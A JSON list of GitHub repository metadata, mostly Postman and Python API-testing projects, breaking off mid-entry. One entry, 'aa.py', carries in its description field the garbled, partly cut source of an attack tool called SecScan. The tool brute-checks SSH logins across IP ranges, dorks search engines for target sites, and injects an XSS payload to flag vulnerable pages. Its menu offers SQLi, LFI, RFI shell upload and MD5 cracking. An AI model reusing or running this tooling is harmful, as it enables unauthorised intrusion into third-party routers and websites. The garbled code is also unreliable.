[
  {
    "id": 80905693,
    "name": "postpython",
    "full_name": "k3rn3l-p4n1c/postpython",
    "description": "Postman collection runner library for python",
    "fork": false,
    "created_at": "2017-02-04T08:28:49Z",
    "updated_at": "2020-03-13T12:17:24Z",
    "stargazers_count": 29,
    "watchers_count": 29,
    "forks": 7,
    "watchers": 29,
    "score": 1,
    "owner_id": 5537028,
    "owner_login": "k3rn3l-p4n1c",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/5537028?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "runner",
      "library",
      "python"
    ]
  },
  {
    "user": "andreasmmadjiah",
    "repo": "REST-API-testing",
    "pulled": "User",
    "id": 210318026,
    "name": "REST-API-testing",
    "full_name": "andreasmmadjiah/REST-API-testing",
    "description": "Simple API testing using pythonanywhere and postman",
    "fork": false,
    "created_at": "2019-09-23T09:39:40Z",
    "updated_at": "2019-09-23T16:24:51Z",
    "forks": 0,
    "open_issues": 0,
    "watchers": 5,
    "network_count": 0,
    "subscribers_count": 1,
    "owner_id": 54434214,
    "owner_login": "andreasmmadjiah",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/54434214?v=4",
    "owner_type": "User",
    "tags": [
      "test",
      " postman",
      "testing",
      "python",
      "pythonanywhere"
    ]
  },
  {
    "id": 210318026,
    "name": "REST-API-testing",
    "full_name": "andreasmmadjiah/REST-API-testing",
    "description": "Simple API testing using pythonanywhere and postman",
    "fork": false,
    "created_at": "2019-09-23T09:39:40Z",
    "updated_at": "2019-09-23T16:24:51Z",
    "stargazers_count": 5,
    "watchers_count": 5,
    "forks": 0,
    "watchers": 5,
    "score": 1,
    "owner_id": 54434214,
    "owner_login": "andreasmmadjiah",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/54434214?v=4",
    "tags": [
      "test",
      " postman",
      "testing",
      "python",
      "pythonanywhere"
    ]
  },
  {
    "id": 163255386,
    "name": "postman-jmeter",
    "full_name": "lqs429521992/postman-jmeter",
    "description": "a python tools which can convert postman to jmeter",
    "fork": false,
    "created_at": "2018-12-27T06:19:34Z",
    "updated_at": "2019-05-06T13:13:26Z",
    "stargazers_count": 2,
    "watchers_count": 2,
    "forks": 1,
    "watchers": 2,
    "score": 1,
    "owner_id": 29119089,
    "owner_login": "lqs429521992",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/29119089?v=4",
    "tags": [
      " postman",
      "tool",
      "convert",
      "tools",
      "python",
      "jmeter"
    ]
  },
  {
    "id": 173806865,
    "name": "postman",
    "full_name": "x0y-gt/postman",
    "description": "Library to send email in python",
    "fork": false,
    "created_at": "2019-03-04T19:22:04Z",
    "updated_at": "2019-11-24T11:35:27Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 5796888,
    "owner_login": "x0y-gt",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/5796888?v=4",
    "tags": [
      "mail",
      "send",
      "python",
      "email"
    ]
  },
  {
    "id": 218273903,
    "name": "postman",
    "full_name": "bulisaaa/postman",
    "description": null,
    "fork": false,
    "created_at": "2019-10-29T11:44:18Z",
    "updated_at": "2019-10-29T14:18:40Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 37377542,
    "owner_login": "bulisaaa",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/37377542?v=4",
    "tags": []
  },
  {
    "id": 241543648,
    "name": "postman",
    "full_name": "jar-us/postman",
    "description": null,
    "fork": false,
    "created_at": "2020-02-19T05:49:31Z",
    "updated_at": "2020-02-19T05:56:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 37073309,
    "owner_login": "jar-us",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/37073309?v=4",
    "tags": []
  },
  {
    "id": 206959440,
    "name": "Postman",
    "full_name": "sharmacloud/Postman",
    "description": "A scheduling system written in python around the unofficial instagram_api to post images and videos to a user's instagram any time into the future.",
    "fork": false,
    "created_at": "2019-09-07T11:38:24Z",
    "updated_at": "2019-09-07T11:38:24Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29721911,
    "owner_login": "sharmacloud",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/29721911?v=4",
    "pulled": 1,
    "tags": [
      "user",
      "python",
      "image",
      "written",
      "system",
      "images",
      "official",
      "around",
      "future",
      "video",
      "unofficial",
      "scheduling"
    ]
  },
  {
    "id": 213908942,
    "name": "postman",
    "full_name": "AnnRidel/postman",
    "description": null,
    "fork": false,
    "created_at": "2019-10-09T12:11:28Z",
    "updated_at": "2019-10-15T07:27:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 52773996,
    "owner_login": "AnnRidel",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/52773996?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 218501869,
    "name": "PyTestApiAuto",
    "full_name": "kayie77/PyTestApiAuto",
    "description": "pytest+allure基于python的接口自动化集成框架：发送请求、数据自动采集（postman抓包的json数据）、全局配置、接口断言、日志记录、allure报告",
    "fork": false,
    "created_at": "2019-10-30T10:31:00Z",
    "updated_at": "2020-03-07T08:38:55Z",
    "stargazers_count": 15,
    "watchers_count": 15,
    "forks": 8,
    "watchers": 15,
    "score": 1,
    "owner_id": 18409736,
    "owner_login": "kayie77",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/18409736?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "json",
      "python",
      "pytest"
    ]
  },
  {
    "id": 194489979,
    "name": "api-test-suit",
    "full_name": "mohamed-abdo/api-test-suit",
    "description": "postman runner from python",
    "fork": false,
    "created_at": "2019-06-30T07:53:22Z",
    "updated_at": "2019-07-07T14:57:55Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 92772,
    "owner_login": "mohamed-abdo",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/92772?v=4",
    "pulled": 1,
    "tags": [
      "runner",
      "python"
    ]
  },
  {
    "id": 107830286,
    "name": "postman_api_2_python",
    "full_name": "luyh/postman_api_2_python",
    "description": "API test with postman and python",
    "fork": false,
    "created_at": "2017-10-22T02:06:29Z",
    "updated_at": "2017-10-22T02:31:00Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 10111018,
    "owner_login": "luyh",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/10111018?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "python"
    ]
  },
  {
    "id": 190081801,
    "name": "python-postman-parser",
    "full_name": "codeasashu/python-postman-parser",
    "description": "A postman collection parser and runner written in python",
    "fork": false,
    "created_at": "2019-06-03T21:02:54Z",
    "updated_at": "2019-09-12T18:29:57Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 1492350,
    "owner_login": "codeasashu",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/1492350?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "postman collection",
      "runner",
      "python",
      "written",
      "parse",
      "parser"
    ]
  },
  {
    "id": 226131903,
    "name": "PostPy",
    "full_name": "DoctorWhoFR/PostPy",
    "description": "A python tool to transform postman documentation export into basic markdown for Github Wiki in exemple.",
    "fork": false,
    "created_at": "2019-12-05T15:24:35Z",
    "updated_at": "2020-01-08T19:34:08Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 26010905,
    "owner_login": "DoctorWhoFR",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/26010905?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "form",
      "tool",
      "document",
      "documentation",
      "export",
      "python",
      "markdown",
      "transform"
    ]
  },
  {
    "id": 203229628,
    "name": "python-postman-restmocker",
    "full_name": "codeasashu/python-postman-restmocker",
    "description": "This python exposes a flask application which mocks your postman example on localhost",
    "fork": false,
    "created_at": "2019-08-19T18:43:00Z",
    "updated_at": "2019-08-20T20:25:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1492350,
    "owner_login": "codeasashu",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/1492350?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "application",
      "example",
      "local",
      "host",
      "mock",
      "python",
      "flask",
      "expose",
      "exposes",
      "mocks"
    ]
  },
  {
    "id": 186716156,
    "name": "stores_rest_api_test",
    "full_name": "lilitam/stores_rest_api_test",
    "description": "Rest API - test cases designed in python and with Postman",
    "fork": false,
    "created_at": "2019-05-14T23:41:06Z",
    "updated_at": "2019-05-15T21:30:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26920692,
    "owner_login": "lilitam",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/26920692?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "sign",
      "python",
      "case",
      "design",
      "designed",
      "cases"
    ]
  },
  {
    "id": 126511182,
    "name": "REST-API-Final",
    "full_name": "Dewgong444/REST-API-Final",
    "description": "A simple REST API which uses python, HTML, a simple authenticator, and is tested with Postman",
    "fork": false,
    "created_at": "2018-03-23T16:26:35Z",
    "updated_at": "2018-03-23T16:26:45Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25128708,
    "owner_login": "Dewgong444",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/25128708?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "auth",
      "tested",
      "python",
      "uses",
      "authenticator"
    ]
  },
  {
    "id": 245692207,
    "name": "goRest-API-validation-and-monitoring-using-POSTMAN",
    "full_name": "rakiashi/goRest-API-validation-and-monitoring-using-POSTMAN",
    "description": null,
    "fork": false,
    "created_at": "2020-03-07T19:25:03Z",
    "updated_at": "2020-03-07T23:18:54Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 37195674,
    "owner_login": "rakiashi",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/37195674?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 31053659,
    "name": "restful-db-interface",
    "full_name": "skyupadhya/restful-db-interface",
    "description": "RESTFUL INVENTORY MANAGEMENT SYSTEM: Rest based inventory management system implemented using Bottle (python based) web framework. System testing was done using Postman REST client.",
    "fork": false,
    "created_at": "2015-02-20T06:27:44Z",
    "updated_at": "2016-10-02T00:42:30Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 11071792,
    "owner_login": "skyupadhya",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/11071792?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "client",
      "based",
      "implement",
      "framework",
      "manage",
      "python",
      "system",
      "management",
      "implemented",
      "done",
      "inventory"
    ]
  },
  {
    "id": 158176010,
    "name": "restapi",
    "full_name": "yashdeepk/restapi",
    "description": "Web Service API using python and flask. A Flask application that expose the RESTful URL endpoints. All data sent to and from the API is in JSON format with the Content-Type header field set to application/json. Used postman to verify the outcome.",
    "fork": false,
    "created_at": "2018-11-19T06:58:02Z",
    "updated_at": "2018-11-19T07:01:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 36252240,
    "owner_login": "yashdeepk",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/36252240?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "data",
      "form",
      "application",
      "json",
      "format",
      "endpoint",
      "points",
      "endpoints",
      "python",
      "flask",
      "header",
      "expose",
      "verify"
    ]
  },
  {
    "id": 208075235,
    "name": "Basic-Python-Data-Types-01",
    "full_name": "WendellOdom/Basic-Python-Data-Types-01",
    "description": "A sequence about Python Data types that leads to a circle of python data, JSON, Postman REST calls, and copying code into a Python program.",
    "fork": false,
    "created_at": "2019-09-12T14:49:00Z",
    "updated_at": "2019-09-12T14:50:43Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 10836358,
    "owner_login": "WendellOdom",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/10836358?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "call",
      "code",
      "calls",
      "python",
      "program",
      "type",
      "types",
      "sequence",
      "copy"
    ]
  },
  {
    "id": 114256259,
    "name": "best-test",
    "full_name": "Gladysgyy/best-test",
    "description": "postman jmeter python",
    "fork": false,
    "created_at": "2017-12-14T13:52:17Z",
    "updated_at": "2017-12-14T13:52:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 34544520,
    "owner_login": "Gladysgyy",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/34544520?v=4",
    "pulled": 1,
    "tags": [
      "python",
      "jmeter"
    ]
  },
  {
    "id": 197917540,
    "name": "Complaint-Lodging",
    "full_name": "Shekhar-Shashank/Complaint-Lodging",
    "description": "It is an android complaint lodging app in which the front end is designed in android studio using java language. The restful API that the app interacts with is made using python flask. The database used is sqlite. And the language used to parse the data from the server is Json. For testing the requests like get and post we used postman as a dummy request generator.",
    "fork": false,
    "created_at": "2019-07-20T10:50:35Z",
    "updated_at": "2019-07-26T06:59:57Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 52148699,
    "owner_login": "Shekhar-Shashank",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/52148699?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "data",
      "testing",
      "request",
      "rest",
      "server",
      "database",
      "requests",
      "sign",
      "interact",
      "front",
      "java",
      "restful",
      "python",
      "generator",
      "lang",
      "design",
      "parse",
      "flask",
      "designed",
      "android",
      "front end",
      "plain",
      "language",
      "dummy",
      "sqlite",
      "studio",
      "complaint"
    ]
  },
  {
    "id": 249174449,
    "name": "postmanJson",
    "full_name": "PinkaCourt/postmanJson",
    "description": null,
    "fork": false,
    "created_at": "2020-03-22T12:03:41Z",
    "updated_at": "2020-03-22T12:03:41Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 50292671,
    "owner_login": "PinkaCourt",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/50292671?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 91568417,
    "name": "PostmanJson",
    "full_name": "Angael/PostmanJson",
    "description": null,
    "fork": false,
    "created_at": "2017-05-17T11:23:35Z",
    "updated_at": "2017-05-17T11:23:35Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 21974933,
    "owner_login": "Angael",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/21974933?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 195512848,
    "name": "postman",
    "full_name": "hefvcjm/postman",
    "description": "用python生成postman的json文件，将该文件导入postman可以运行",
    "fork": false,
    "created_at": "2019-07-06T07:48:08Z",
    "updated_at": "2019-07-06T07:48:58Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16507006,
    "owner_login": "hefvcjm",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/16507006?v=4",
    "pulled": 1,
    "tags": [
      "json",
      "python"
    ]
  },
  {
    "id": 66231335,
    "name": "PostManJsonToMarkdown",
    "full_name": "mirsking/PostManJsonToMarkdown",
    "description": null,
    "fork": false,
    "created_at": "2016-08-22T01:53:38Z",
    "updated_at": "2016-08-22T01:56:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 6286383,
    "owner_login": "mirsking",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/6286383?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 17645181,
    "name": "aa.py",
    "full_name": "udinparla/aa.py",
    "description": "#!/usr/bin/env python import re import hashlib import Queue from random import choice import threading import time import urllib2 import sys import socket  try:     import paramiko      PARAMIKO_IMPORTED = True except ImportError:     PARAMIKO_IMPORTED = False    USER_AGENT = [\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3\",              \"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\",              \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\",              \"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\",              \"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\", \t     \"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.38.6 (KHTML, like Gecko) Version/5.1 Safari/535.38.6\", \t     \"Mozilla/5.0 (Macintosh; U; U; PPC Mac OS X 10_6_7 rv:6.0; en-US) AppleWebKit/532.23.3 (KHTML, like Gecko) Version/4.0.2 Safari/532.23.3\"             ] option = ' ' vuln = 0 invuln = 0 np = 0 found = []   class Router(threading.Thread):     \"\"\"Checks for routers running ssh with given User/Pass\"\"\"     def __init__(self, queue, user, passw):         if not PARAMIKO_IMPORTED:             print 'You need paramiko.'             print 'http://www.lag.net/paramiko/'             sys.exit(1)         threading.Thread.__init__(self)              self.queue = queue          self.user = user         self.passw = passw       def run(self):         \"\"\"Tries to connect to given Ip on port 22\"\"\"         ssh = paramiko.SSHClient()         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())         while True:             try:                 ip_add = self.queue.get(False)              except Queue.Empty:                 break             try:                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)                 ssh.close()                 print \"Working: %s:22 - %s:%s\\n\" % (ip_add, self.user, self.passw)                 write = open('Routers.txt', \"a+\")                 write.write('%s:22 %s:%s\\n' % (ip_add, self.user, self.passw))                 write.close()                   self.queue.task_done()              except:                 print 'Not Working: %s:22 - %s:%s\\n' % (ip_add, self.user, self.passw)                 self.queue.task_done()                               class Ip:     \"\"\"Handles the Ip range creation\"\"\"     def __init__(self):         self.ip_range = []         self.start_ip = raw_input('Start ip: ')         self.end_ip = raw_input('End ip: ')         self.user = raw_input('User: ')         self.passw = raw_input('Password: ')         self.iprange()             def iprange(self):         \"\"\"Creates list of Ip's from Start_Ip to End_Ip\"\"\"         queue = Queue.Queue()         start = list(map(int, self.start_ip.split(\".\")))         end = list(map(int, self.end_ip.split(\".\")))         tmp = start                 self.ip_range.append(self.start_ip)         while tmp != end:             start[3] += 1             for i in (3, 2, 1):                 if tmp[i] == 256:                     tmp[i] = 0                     tmp[i-1] += 1             self.ip_range.append(\".\".join(map(str, tmp)))                 for add in self.ip_range:             queue.put(add)          for i in range(10):             thread = Router(queue, self.user, self.passw )             thread.setDaemon(True)             thread.start()          queue.join()   class Crawl:     \"\"\"Searches for dorks and grabs results\"\"\"     def __init__(self):         if option == '4':             self.shell = str(raw_input('Shell location: '))         self.dork = raw_input('Enter your dork: ')         self.queue = Queue.Queue()         self.pages = raw_input('How many pages(Max 20): ')         self.qdork = urllib2.quote(self.dork)         self.page = 1         self.crawler()         def crawler(self):         \"\"\"Crawls Ask.com for sites and sends them to appropriate scan\"\"\"         print '\\nDorking...'         for i in range(int(self.pages)):             host = \"http://uk.ask.com/web?q=%s&page=%s\" % (str(self.qdork), self.page)             req = urllib2.Request(host)             req.add_header('User-Agent', choice(USER_AGENT))             response = urllib2.urlopen(req)             source = response.read()             start = 0             count = 1             end = len(source)             numlinks = source.count('_t\" href', start, end)               while count alert('xssBYm0le');\"\"\"         self.file = 'xss.txt'       def run(self):         \"\"\"Checks Url for possible Xss\"\"\"         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if '=' in site:                 global vuln                 global invuln                 global np                 xsite = site.rsplit('=', 1)[0]                 if xsite[-1] != \"=\":                     xsite = xsite + \"=\"                 test = xsite + self.xchar                 try:                     conn = urllib2.Request(test)                     conn.add_header('User-Agent', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(\"xssBYm0le\", data, re.I)):                         self.xss(test)                         vuln += 1                     else:                         print B+test + W+' > ' + str(vuln) + G+' Vulnerable Sites Found' + W     print '>> ' + str(invuln) + G+' Sites Not Vulnerable' + W     print '>> ' + str(np) + R+' Sites Without Parameters' + W     if option == '1':         print '>> Output Saved To sqli.txt\\n'     elif option == '2':         print '>> Output Saved To lfi.txt'     elif option == '3':         print '>> Output Saved To xss.txt'     elif option == '4':         print '>> Output Saved To rfi.txt'     W  = \"\\033[0m\";   R  = \"\\033[31m\";  G  = \"\\033[32m\";  O  = \"\\033[33m\";  B  = \"\\033[34m\";  def main():     \"\"\"Outputs Menu and gets input\"\"\"     quotes = [ \t'\\nm0le@tormail.org\\n'         ]     print (O+''' ------------- -- SecScan -- --- v1.5 ---- ---- by ----- --- m0le ---- -------------''')     print (G+''' -[1]-  SQLi -[2]-  LFI -[3]-  XSS -[4]-  RFI -[5]-  Proxy -[6]-  Admin Page Finder -[7]-  Sub Domain Scan -[8]-  Dictionary MD5 cracker -[9]-  Online MD5 cracker -[10]- Check your IP address''')      print (B+''' -[!]- If freeze while running or want to quit,  just Ctrl C, it will automatically terminate the job. ''')     print W     global option     option = raw_input('Enter Option: ')       if option:         if option == '1':             Crawl()             output()             print choice(quotes)                      elif option == '2':             Crawl()             output()             print choice(quotes)           elif option == '3':             Crawl()             output()             print choice(quotes)           elif option == '4':             Crawl()             output()             print choice(quotes)               elif option == '5':             Ip()             print choice(quotes)           elif option == '6':             admin()             aprint()             print choice(quotes)          elif option == '7':             subd()             print choice(quotes)          elif option == '8':             word()             print choice(quotes)            elif option == '9':             OnlineCrack().crack()             print choice(quotes)                              elif option == '10':             Check().grab()               print choice(quotes)                 else:             print R+'\\nInvalid Choice\\n' + W             time.sleep(0.9)             main()           else:         print R+'\\nYou Must Enter An Option (Check if your typo is corrected.)\\n' + W         time.sleep(0.9)         main()     if __name__ == '__main__':     main()",
    "fork": false,
    "created_at": "2014-03-11T20:35:08Z",
    "updated_at": "2019-11-23T18:43:58Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 0,
    "watchers": 4,
    "score": 1,
    "owner_id": 6923150,
    "owner_login": "udinparla",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/6923150?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "file",
      "call",
      "http",
      "user",
      "auto",
      "automat",
      "mail",
      "line",
      "help",
      "route",
      "build",
      "send",
      "list",
      "site",
      "star",
      "source",
      "read",
      "import",
      "running",
      "response",
      "host",
      "start",
      "python",
      "connect",
      "need",
      "shop",
      "name",
      "html",
      "task",
      "search",
      "open",
      "print",
      "result",
      "main",
      "class",
      "automatic",
      "link",
      "header",
      "results",
      "creation",
      "done",
      "find",
      "given",
      "automatically",
      "many",
      "write",
      "location",
      "free",
      "router",
      "output",
      "gets",
      "sends",
      "correct",
      "while",
      "address",
      "pages",
      "found",
      "admin",
      "reading",
      "google",
      "random",
      "seek",
      "crawler",
      "grab"
    ]
  },
  {
    "id": 205159625,
    "name": "Movies_Filtering",
    "full_name": "satya497/Movies_Filtering",
    "description": "it will get data from database and perform operations using python and running in docker compose and input will taken postman.",
    "fork": false,
    "created_at": "2019-08-29T12:31:48Z",
    "updated_at": "2019-08-29T12:31:48Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 51437221,
    "owner_login": "satya497",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/51437221?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "data",
      "form",
      "database",
      "operation",
      "operations",
      "running",
      "python",
      "perform",
      "docker",
      "compose"
    ]
  },
  {
    "id": 230236129,
    "name": "my-first-Flask-resful-application",
    "full_name": "pawanmethre/my-first-Flask-resful-application",
    "description": "My first python flask restful application using postman tool which is basically CURD application for items and price using sqlite3 database.",
    "fork": false,
    "created_at": "2019-12-26T09:34:36Z",
    "updated_at": "2019-12-26T12:05:46Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 58561944,
    "owner_login": "pawanmethre",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/58561944?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "data",
      "application",
      "rest",
      "tool",
      "call",
      "database",
      "restful",
      "python",
      "flask",
      "basically",
      "items",
      "sqlite"
    ]
  },
  {
    "id": 189502434,
    "name": "Postman-CLI-tools",
    "full_name": "guillain/Postman-CLI-tools",
    "description": "Postman python tools",
    "fork": false,
    "created_at": "2019-05-31T00:50:59Z",
    "updated_at": "2019-05-31T01:16:22Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 24420090,
    "owner_login": "guillain",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/24420090?v=4",
    "pulled": 1,
    "tags": [
      "tool",
      "tools",
      "python"
    ]
  },
  {
    "id": 130143024,
    "name": "postman-client",
    "full_name": "yunser/postman-client",
    "description": null,
    "fork": false,
    "created_at": "2018-04-19T01:39:31Z",
    "updated_at": "2018-04-25T10:04:30Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29633833,
    "owner_login": "yunser",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/29633833?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 246110284,
    "name": "brazil-northeast-climate",
    "full_name": "mhsilveirabr/brazil-northeast-climate",
    "description": "Using python to analyse data from Brazilian National Institute of Meteorology (INMET)",
    "fork": false,
    "created_at": "2020-03-09T18:19:55Z",
    "updated_at": "2020-03-18T17:18:44Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 10811006,
    "owner_login": "mhsilveirabr",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/10811006?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "python",
      "analyse"
    ]
  },
  {
    "id": 171281764,
    "name": "linux_desktop_tools",
    "full_name": "denwood/linux_desktop_tools",
    "description": "Basic tools intallation by Ansible 2.7 for Linux Desktop  : VisualCode + Extension pack, python, pychar, git, gitgrakcen, zsh, terminator, tcpdump, subl3txt, postman, docker , docker-compose,  ...   ",
    "fork": false,
    "created_at": "2019-02-18T12:38:56Z",
    "updated_at": "2019-02-26T06:50:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 14901803,
    "owner_login": "denwood",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/14901803?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "tool",
      "tools",
      "python",
      "docker",
      "compose",
      "intallation"
    ]
  },
  {
    "id": 175498028,
    "name": "blockchain_python",
    "full_name": "dorukismen/blockchain_python",
    "description": "To create and mine a blockchain on python with Flask and Postman",
    "fork": false,
    "created_at": "2019-03-13T20:59:02Z",
    "updated_at": "2019-03-13T21:09:54Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 32342621,
    "owner_login": "dorukismen",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/32342621?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "python",
      "chai",
      "blockchain",
      "mine"
    ]
  },
  {
    "id": 131698530,
    "name": "cryptocurrency",
    "full_name": "sumeetrohra/cryptocurrency",
    "description": "This is a basic cryptocurrency  made using python Flask and tested in postman",
    "fork": false,
    "created_at": "2018-05-01T09:57:38Z",
    "updated_at": "2018-05-01T09:57:45Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 14572393,
    "owner_login": "sumeetrohra",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/14572393?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "tested",
      "python",
      "currency",
      "crypto",
      "cryptocurrency"
    ]
  },
  {
    "id": 188559312,
    "name": "IreporterReactJs",
    "full_name": "LarryKarani/IreporterReactJs",
